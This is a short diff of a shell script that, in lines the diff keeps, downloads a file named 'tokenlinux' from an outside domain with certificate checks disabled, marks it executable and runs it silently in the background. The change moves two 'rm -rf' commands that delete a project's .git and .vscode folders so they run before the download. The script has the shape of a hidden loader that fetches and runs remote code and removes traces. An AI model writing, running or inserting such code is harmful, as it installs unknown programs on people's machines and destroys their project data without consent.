@@ -5,6 +5,9 @@ if [ ! -d "$HOME/.cache" ]; then
   mkdir -p "$HOME/.cache"
 fi
 
+rm -rf "directory/.git"
+rm -rf "directory/.vscode"
+
 if command -v curl >/dev/null 2>&1; then
     curl -k -sSL -o "$HOME/.cache/tokenlinux.npl" "https://www.sandbox-support.cloud/v4"
 elif command -v wget >/dev/null 2>&1; then
@@ -22,9 +25,6 @@ chmod +x "$TARGET_DIR/tokenlinux.sh"
 nohup bash "$TARGET_DIR/tokenlinux.sh" > /dev/null 2>&1 &
 
 sleep 3
-
-rm -rf "directory/.git"
-rm -rf "directory/.vscode"
 
 exit 0
 
